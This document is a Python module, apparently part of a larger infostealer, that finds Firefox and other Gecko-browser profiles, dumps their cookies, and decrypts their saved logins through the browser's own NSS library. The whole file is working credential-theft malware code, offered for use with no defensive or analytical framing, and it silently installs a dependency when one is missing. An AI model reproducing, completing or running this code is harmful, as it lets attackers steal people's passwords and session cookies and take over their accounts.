# modules/firefox_stealer.py - Firefox/Gecko browser cookie and password theft

import os
import sys
import subprocess
import sqlite3
import json
import base64
import shutil
from pathlib import Path
from ctypes import *
from config import ROAMING, log

def install_import(modules):
    for module, pip_name in modules:
        try:
            __import__(module)
        except ImportError:
            subprocess.check_call([sys.executable, "-m", "pip", "install", pip_name],
                                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            os.execl(sys.executable, sys.executable, *sys.argv)

install_import([("psutil", "psutil")])

import psutil

# Gecko-based browsers to check
GECKO_BROWSERS = {
    'Firefox': ROAMING + '\\Mozilla\\Firefox',
    'Waterfox': ROAMING + '\\Waterfox',
    'K-Meleon': ROAMING + '\\K-Meleon',
    'Thunderbird': ROAMING + '\\Thunderbird',
    'IceDragon': ROAMING + '\\Comodo\\IceDragon',
    'Cyberfox': ROAMING + '\\8pecxstudios\\Cyberfox',
    'BlackHawk': ROAMING + '\\NETGATE Technologies\\BlackHawk',
    'Pale Moon': ROAMING + '\\Moonchild Productions\\Pale Moon'
}

class NSS3Decryptor:
    """Interface to Firefox's NSS3.dll for password decryption"""
    
    class SECItem(Structure):
        _fields_ = [
            ('type', c_uint),
            ('data', POINTER(c_ubyte)),
            ('len', c_uint)
        ]
    
    def __init__(self):
        self.nss3 = None
        self.mozglue = None
        
    def load_nss(self, nss_path):
        """Load nss3.dll and mozglue.dll"""
        try:
            # Load mozglue first
            mozglue_path = os.path.join(nss_path, 'mozglue.dll')
            nss3_path = os.path.join(nss_path, 'nss3.dll')
            
            if not os.path.exists(mozglue_path) or not os.path.exists(nss3_path):
                return False
            
            self.mozglue = CDLL(mozglue_path)
            self.nss3 = CDLL(nss3_path)
            
            # Setup function signatures
            self.nss3.NSS_Init.argtypes = [c_char_p]
            self.nss3.NSS_Init.restype = c_int
            
            self.nss3.PK11SDR_Decrypt.argtypes = [POINTER(self.SECItem), POINTER(self.SECItem), c_void_p]
            self.nss3.PK11SDR_Decrypt.restype = c_int
            
            self.nss3.NSS_Shutdown.argtypes = []
            self.nss3.NSS_Shutdown.restype = c_int
            
            return True
        except Exception as e:
            log(f"Failed to load NSS3: {e}")
            return False
    
    def set_profile(self, profile_path):
        """Initialize NSS with profile path"""
        try:
            return self.nss3.NSS_Init(profile_path.encode('utf-8')) == 0
        except:
            return False
    
    def decrypt_password(self, encrypted_data):
        """Decrypt password using PK11SDR_Decrypt"""
        try:
            decoded_data = base64.b64decode(encrypted_data)
            
            # Create input SECItem
            inp = self.SECItem()
            inp.type = 0
            inp.data = cast(c_char_p(decoded_data), POINTER(c_ubyte))
            inp.len = len(decoded_data)
            
            # Create output SECItem
            out = self.SECItem()
            
            # Decrypt
            if self.nss3.PK11SDR_Decrypt(byref(inp), byref(out), None) == 0:
                if out.len != 0:
                    decrypted = string_at(out.data, out.len)
                    return decrypted.decode('utf-8')
            
            return None
        except Exception as e:
            log(f"Decryption failed: {e}")
            return None
    
    def unload(self):
        """Shutdown NSS and unload libraries"""
        try:
            if self.nss3:
                self.nss3.NSS_Shutdown()
        except:
            pass

def find_firefox_profiles():
    """Find all Firefox/Gecko browser profiles"""
    profiles = {}
    
    for browser_name, browser_path in GECKO_BROWSERS.items():
        if not os.path.exists(browser_path):
            continue
        
        profiles_path = os.path.join(browser_path, 'Profiles')
        if not os.path.exists(profiles_path):
            continue
        
        for profile_dir in os.listdir(profiles_path):
            profile_full_path = os.path.join(profiles_path, profile_dir)
            
            # Check if it's a valid profile (has logins.json or cookies.sqlite)
            if os.path.isdir(profile_full_path):
                if (os.path.exists(os.path.join(profile_full_path, 'logins.json')) or
                    os.path.exists(os.path.join(profile_full_path, 'cookies.sqlite'))):
                    
                    if browser_name not in profiles:
                        profiles[browser_name] = []
                    profiles[browser_name].append(profile_full_path)
    
    return profiles

def find_nss3_path():
    """Find nss3.dll location (usually in Firefox install directory)"""
    program_files = [
        os.environ.get('ProgramW6432', r'C:\Program Files'),
        os.environ.get('ProgramFiles(x86)', r'C:\Program Files (x86)')
    ]
    
    for pf in program_files:
        if not os.path.exists(pf):
            continue
        
        for item in os.listdir(pf):
            item_path = os.path.join(pf, item)
            if os.path.isdir(item_path):
                nss3 = os.path.join(item_path, 'nss3.dll')
                mozglue = os.path.join(item_path, 'mozglue.dll')
                
                if os.path.exists(nss3) and os.path.exists(mozglue):
                    return item_path
    
    return None

def get_firefox_cookies(profile_path):
    """Extract cookies from Firefox profile"""
    cookies = []
    cookies_db = os.path.join(profile_path, 'cookies.sqlite')
    
    if not os.path.exists(cookies_db):
        return cookies
    
    try:
        # Copy to temp to avoid lock issues
        temp_db = os.path.join(os.environ['TEMP'], 'cookies_temp.sqlite')
        shutil.copy2(cookies_db, temp_db)
        
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        
        cursor.execute("""
            SELECT host, name, value, path, expiry, isSecure 
            FROM moz_cookies
        """)
        
        for row in cursor.fetchall():
            cookies.append({
                'host': row[0],
                'name': row[1],
                'value': row[2],
                'path': row[3],
                'expiry': row[4],
                'secure': bool(row[5])
            })
        
        conn.close()
        os.remove(temp_db)
        
    except Exception as e:
        log(f"Cookie extraction failed: {e}")
    
    return cookies

def get_firefox_passwords(profile_path, nss3_path):
    """Extract and decrypt passwords from Firefox profile"""
    passwords = []
    logins_file = os.path.join(profile_path, 'logins.json')
    
    if not os.path.exists(logins_file):
        return passwords
    
    if not nss3_path:
        log("NSS3 path not found, cannot decrypt passwords")
        return passwords
    
    try:
        # Read logins.json
        with open(logins_file, 'r', encoding='utf-8') as f:
            data = json.load(f)
        
        if 'logins' not in data:
            return passwords
        
        # Copy required files to temp directory for NSS
        temp_profile = os.path.join(os.environ['TEMP'], 'ff_temp_profile')
        if os.path.exists(temp_profile):
            shutil.rmtree(temp_profile)
        os.makedirs(temp_profile)
        
        required_files = ['key3.db', 'key4.db', 'logins.json', 'cert9.db']
        for file in required_files:
            src = os.path.join(profile_path, file)
            if os.path.exists(src):
                shutil.copy2(src, temp_profile)
        
        # Initialize NSS decryptor
        decryptor = NSS3Decryptor()
        if not decryptor.load_nss(nss3_path):
            log("Failed to load NSS3")
            return passwords
        
        if not decryptor.set_profile(temp_profile):
            log("Failed to set NSS profile")
            decryptor.unload()
            return passwords
        
        # Decrypt passwords
        for login in data['logins']:
            try:
                url = login.get('hostname', '')
                encrypted_user = login.get('encryptedUsername', '')
                encrypted_pass = login.get('encryptedPassword', '')
                
                if encrypted_pass:
                    username = decryptor.decrypt_password(encrypted_user)
                    password = decryptor.decrypt_password(encrypted_pass)
                    
                    if password:
                        passwords.append({
                            'url': url,
                            'username': username if username else '',
                            'password': password
                        })
            except Exception as e:
                log(f"Failed to decrypt login: {e}")
                continue
        
        decryptor.unload()
        
        # Cleanup
        try:
            shutil.rmtree(temp_profile)
        except:
            pass
        
    except Exception as e:
        log(f"Password extraction failed: {e}")
    
    return passwords

def grab():
    """Main function to steal Firefox data"""
    log("Grabbing Firefox/Gecko browser data...")
    
    profiles = find_firefox_profiles()
    if not profiles:
        log("No Firefox profiles found")
        return None
    
    nss3_path = find_nss3_path()
    if not nss3_path:
        log("NSS3 not found - passwords will not be decrypted")
    
    firefox_data = {}
    
    for browser_name, profile_paths in profiles.items():
        firefox_data[browser_name] = []
        
        for profile_path in profile_paths:
            profile_name = os.path.basename(profile_path)
            
            # Get cookies
            cookies = get_firefox_cookies(profile_path)
            
            # Get passwords
            passwords = get_firefox_passwords(profile_path, nss3_path) if nss3_path else []
            
            if cookies or passwords:
                firefox_data[browser_name].append({
                    'profile': profile_name,
                    'cookies': cookies,
                    'passwords': passwords
                })
                
                log(f"Grabbed {len(cookies)} cookies, {len(passwords)} passwords from {browser_name}/{profile_name}")
    
    return firefox_data if firefox_data else None